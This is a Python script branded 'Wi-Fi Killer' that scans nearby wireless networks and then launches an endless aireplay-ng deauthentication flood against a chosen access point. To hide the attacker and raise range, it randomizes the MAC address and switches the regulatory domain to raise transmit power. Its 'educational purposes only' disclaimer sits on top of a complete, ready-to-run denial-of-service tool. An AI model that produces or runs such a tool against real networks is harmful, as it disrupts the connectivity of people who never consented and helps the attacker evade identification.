import subprocess
import re
from tabulate import tabulate
import signal
import sys
import os
import time

# Check if the user is root, if not, exit with a warning
if os.geteuid() != 0:
    print("\033[1;31m[ERROR] You must run this script as root! Exiting...\033[0m")
    sys.exit(1)

# Clear terminal
os.system('clear')

# Color codes for terminal output
RED = "\033[1;31m"
GREEN = "\033[1;32m"
YELLOW = "\033[1;33m"
BLUE = "\033[1;34m"
MAGENTA = "\033[1;35m"
CYAN = "\033[1;36m"
RESET = "\033[0m"  # Reset to default color

# Wi-Fi Killer Banner in ASCII Art
print("\033[1;32m")
print("""
██╗    ██╗██╗      ███████╗██╗    ██╗  ██╗██╗██╗     ██╗     ███████╗██████╗ 
██║    ██║██║      ██╔════╝██║    ██║ ██╔╝██║██║     ██║     ██╔════╝██╔══██╗
██║ █╗ ██║██║█████╗█████╗  ██║    █████╔╝ ██║██║     ██║     █████╗  ██████╔╝
██║███╗██║██║╚════╝██╔══╝  ██║    ██╔═██╗ ██║██║     ██║     ██╔══╝  ██╔══██╗
╚███╔███╔╝██║      ██║     ██║    ██║  ██╗██║███████╗███████╗███████╗██║  ██║
 ╚══╝╚══╝ ╚═╝      ╚═╝     ╚═╝    ╚═╝  ╚═╝╚═╝╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝
                                                                       by:thisudo 
[!] Wi-Fi Deauthentication Script [!]                
    For educational purposes only!
    Use at your own risk on your own network!
    I am not responsible for any misuse!
""")
print("\033[1;34m" + "*" * 50)
print("\033[1;36m[INFO] Scan networks and launch deauth attack.\033[0m")
print("\033[1;31m[WARNING] Only use this on networks you own!\033[0m")
print("\033[1;34m" + "*" * 50)

time.sleep(3)

# Main Code
subprocess.run(["iwconfig"], check=True)
intrface = input(f'{GREEN}[?]{RESET} Enter your INTERFACE: ').strip()

# Function to handle Ctrl+C
def handle_interrupt(signal, frame):
    print(f"\n{RED}[!] Detected Ctrl+C! Stopping monitor mode and restarting NetworkManager...{RESET}")
    subprocess.run(["sudo", "airmon-ng", "stop", intrface], check=True)
    subprocess.run(["sudo", "systemctl", "restart", "NetworkManager"], check=True)
    sys.exit(0)  # Exit the script

# Set up the signal handler for Ctrl+C
signal.signal(signal.SIGINT, handle_interrupt)

def get_wifi_data():
    # Run iwlist command to scan available networks
    result = subprocess.run(["sudo", "iwlist", intrface, "scan"], capture_output=True, text=True)
    return result.stdout

def parse_wifi_data(scan_data):
    # Use regular expressions to find relevant details in the scan output
    wifi_networks = []
    cells = scan_data.split("Cell")
    
    for cell in cells[1:]:
        bssid_match = re.search(r"Address: (\S+)", cell)
        ssid_match = re.search(r"ESSID:\"(.*?)\"", cell)
        channel_match = re.search(r"Channel:(\d+)", cell)
        signal_match = re.search(r"Signal level=(-?\d+) dBm", cell)
        encryption_match = re.search(r"Encryption key:(\w+)", cell)
        
        if bssid_match and ssid_match and channel_match and signal_match and encryption_match:
            bssid = bssid_match.group(1)
            ssid = ssid_match.group(1)
            channel = channel_match.group(1)
            signal_strength = signal_match.group(1)
            encryption = "Yes" if encryption_match.group(1) == "on" else "No"
            
            wifi_networks.append([bssid, ssid, channel, signal_strength, encryption])
    
    return wifi_networks

def display_wifi_table(wifi_networks):
    headers = ["BSSID", "SSID", "Channel", "Signal Strength (dBm)", "Encryption"]
    print(tabulate(wifi_networks, headers=headers, tablefmt="pretty"))

def change_channel(channel):
    # Change the channel of the wireless interface to the target channel
    print(f"{GREEN}Changing channel to {channel}...{RESET}")
    subprocess.run(["sudo", "iwconfig", intrface, "channel", str(channel)])

def stop_network_manager():
    # Stop NetworkManager completely to prevent automatic mode switching
    print(f"{GREEN}Stopping NetworkManager...{RESET}")
    subprocess.run(["sudo", "systemctl", "stop", "NetworkManager"])

def mac_anonymize(interface):
    """
    Anonymize MAC address if the interface is not already in monitor mode.
    """
    try:
        print(f"{GREEN}[*] Anonymizing MAC address...{RESET}")
        subprocess.run(["sudo", "ifconfig", interface, "down"], check=True)
        subprocess.run(["sudo", "macchanger", "-r", interface], check=True)  # Randomize MAC
        subprocess.run(["sudo", "ifconfig", interface, "up"], check=True)
        print(f"{GREEN}[+] MAC address anonymized.{RESET}")
    except subprocess.CalledProcessError:
        print(f"{RED}[!] Failed to anonymize MAC address. Proceeding without it.{RESET}")

def start_monitor_mode(interface, tx_power=0):
    """
    Enables monitor mode on the given interface, with optional TX power configuration.
    """
    try:
        # Step 1: Kill interfering processes
        print(f"{GREEN}[*] Killing interfering processes...{RESET}")
        subprocess.run(["sudo", "airmon-ng", "check", "kill"], check=True)
        
        # Step 2: Anonymize MAC address
        mac_anonymize(interface)

        # Step 3: Enable monitor mode
        print(f"{GREEN}[*] Enabling monitor mode on {interface}...{RESET}")
        subprocess.run(["sudo", "airmon-ng", "start", interface], check=True)

        # Optional: Set TX power if specified
        if tx_power > 0:
            print(f"{GREEN}[*] Setting TX power to {tx_power} dBm...{RESET}")
            subprocess.run(["sudo", "iw", "reg", "set", "BO"], check=True)
            subprocess.run(["sudo", "iwconfig", interface, "txpower", str(tx_power)], check=True)
            print(f"{GREEN}[+] TX power set to {tx_power} dBm.{RESET}")

        print(f"{GREEN}[+] Monitor mode enabled on {interface}.{RESET}")
    except subprocess.CalledProcessError as e:
        print(f"{RED}[!] Failed to enable monitor mode on {interface}: {e}{RESET}")
    except Exception as e:
        print(f"{RED}[!] An unexpected error occurred: {e}{RESET}")

def stop_monitor_mode(interface):
    # Stop monitor mode after the attack is complete
    print(f"{GREEN}Stopping monitor mode on {interface}...{RESET}")
    subprocess.run(["sudo", "airmon-ng", "stop", interface])

def disable_interface(interface):
    # Disable the interface to prevent it from being managed
    print(f"{GREEN}Disabling interface {interface}...{RESET}")
    subprocess.run(["sudo", "ifconfig", interface, "down"])

def enable_interface(interface):
    # Enable the interface after completing the deauth
    print(f"{GREEN}Enabling interface {interface}...{RESET}")
    subprocess.run(["sudo", "ifconfig", interface, "up"])

def deauth_wifi(bssid, channel, interface):
    # Stop NetworkManager to prevent it from switching back to managed mode
    # stop_network_manager()

    # Disconnect from the AP (if connected)
    print(f"{GREEN}Disconnecting from the AP...{RESET}")
    subprocess.run(["sudo", "iwconfig", interface, "essid", "off"])

    # Start monitor mode on the specified interface
    start_monitor_mode(interface)

    # Change the channel to the one of the target network
    change_channel(channel)

    # Command to send deauth packets to the specified BSSID
    print(f"{GREEN}Sending deauthentication packets to BSSID: {bssid}{RESET}")
    try:
        # Run the deauth command continuously (send 0 packets until interrupted)
        subprocess.run(["sudo", "aireplay-ng", "-0", "0", "-a", bssid, interface], check=True)
    except KeyboardInterrupt:
        print("\nDeauthentication attack stopped by user.")

def main():
    scan_data = get_wifi_data()
    wifi_networks = parse_wifi_data(scan_data)
    display_wifi_table(wifi_networks)

    # Prompt user to select a Wi-Fi BSSID for deauthentication
    wifi_bssid = input(f'{GREEN}\n [?] Enter the Wi-Fi BSSID to attack: {RESET}').strip()

    # Check if the entered BSSID is in the list
    valid_bssids = [network[0] for network in wifi_networks]
    if wifi_bssid in valid_bssids:
        # Get the channel of the selected BSSID
        wifi_channel = next(network[2] for network in wifi_networks if network[0] == wifi_bssid)
        
        # Specify your interface name
        interface = intrface  # Use the user input for interface

        # Perform deauth attack
        deauth_wifi(wifi_bssid, wifi_channel, interface)
    
    else:
        print(f"{RED}Invalid BSSID entered. Please check and try again.{RESET}")

    signal.signal(signal.SIGINT, handle_interrupt(interface=interface))

if __name__ == "__main__":
    main()
